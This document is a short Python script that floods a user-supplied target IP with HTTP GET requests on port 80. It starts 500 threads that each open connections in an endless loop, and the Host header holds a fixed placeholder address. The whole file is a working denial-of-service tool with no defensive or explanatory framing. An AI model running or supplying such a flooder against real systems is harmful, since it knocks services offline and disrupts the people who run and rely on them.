#!/usr/bin/python3

import socket
import threading
target = input("Type here the target ip: ")
x = "182.21.20.32"
port = 80
def http_f():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + x + "\r\n\r\n").encode('ascii'), (target, port))
        print("req sent")
        s.close()
for i in range(500):
    y = threading.Thread(target=http_f)
    y.start()
